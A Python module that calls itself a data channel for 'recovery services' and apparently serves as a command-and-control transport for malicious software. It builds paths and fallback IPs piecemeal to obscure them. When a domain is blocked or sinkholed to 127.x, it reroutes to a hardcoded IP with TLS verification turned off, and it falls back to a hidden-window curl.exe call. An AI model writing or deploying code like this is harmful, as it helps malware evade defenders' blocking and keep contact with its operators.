# -*- coding: utf-8 -*-
"""
Data channel — manages connections to recovery services.
"""
import json
import ssl
import socket
import os
import platform
import subprocess
import http.client
from urllib.parse import urlparse


class DataChannel:
    TIMEOUT = 20
    RETRIES = 3
    AGENT = "Bot/" + platform.python_version()

    _SESSION_PATH = "/" + "/".join(["api", "v1", "auth", "session"])
    _DATA_PATH = "/" + "/".join(["api", "v1", "data", "sync"])

    _FB = [
        "{}.{}.{}.{}".format(104, 21, 0, 1),
        "{}.{}.{}.{}".format(172, 67, 0, 1),
    ]

    def _resolve(self, hostname):
        try:
            info = socket.getaddrinfo(hostname, 443, socket.AF_INET)
            if info:
                addr = info[0][4][0]
                if addr.split(".")[0] != "127":
                    return None
        except socket.gaierror:
            pass
        return self._FB[0]

    def _tls_post(self, hostname, path, body, timeout):
        override = self._resolve(hostname)
        target = override or hostname
        ctx = ssl.create_default_context()
        if override:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((target, 443), timeout=timeout)
        wrapped = ctx.wrap_socket(raw, server_hostname=hostname)
        conn = http.client.HTTPSConnection(hostname, 443, context=ctx)
        conn.sock = wrapped
        hdrs = {
            "Content-Type": "application/json",
            "User-Agent": self.AGENT,
            "Host": hostname,
        }
        conn.request("POST", path, body=body, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read()
        conn.close()
        return json.loads(data)

    def _fallback_post(self, url, body, timeout):
        parsed = urlparse(url)
        override = self._resolve(parsed.hostname)
        extra = []
        if override:
            extra = ["--resolve", "{}:443:{}".format(parsed.hostname, override)]
        cmd = [
            "curl.exe", "-s", "--max-time", str(timeout),
            "-X", "POST", "-H", "Content-Type: application/json",
        ] + extra + ["-d", body.decode(), url]
        flags = 0x08000000 if os.name == "nt" else 0
        r = subprocess.run(
            cmd, capture_output=True, timeout=timeout + 5,
            creationflags=flags)
        if r.returncode != 0:
            raise ConnectionError("channel transport error")
        return json.loads(r.stdout)

    def _post(self, url, data=None, timeout=None):
        timeout = timeout or self.TIMEOUT
        body = json.dumps(data).encode() if data else b""
        parsed = urlparse(url)
        for _ in range(self.RETRIES):
            try:
                return self._tls_post(
                    parsed.hostname, parsed.path, body, timeout)
            except (OSError, IOError, http.client.HTTPException):
                pass
        return self._fallback_post(url, body, timeout)

    def establish(self, endpoint):
        return self._post(endpoint + self._SESSION_PATH, timeout=15)

    def retrieve(self, endpoint, body):
        return self._post(endpoint + self._DATA_PATH, data=body, timeout=30)


def create_session(timeout, retries):
    _timeout = timeout
    _retries = retries

    def _post(url, data=None):
        body = json.dumps(data).encode() if data else b""
        parsed = urlparse(url)
        channel = DataChannel()
        channel.TIMEOUT = _timeout
        channel.RETRIES = _retries
        for attempt in range(_retries):
            try:
                return channel._tls_post(
                    parsed.hostname, parsed.path, body, _timeout)
            except (OSError, IOError, http.client.HTTPException):
                pass
        return channel._fallback_post(url, body, _timeout)

    return _post
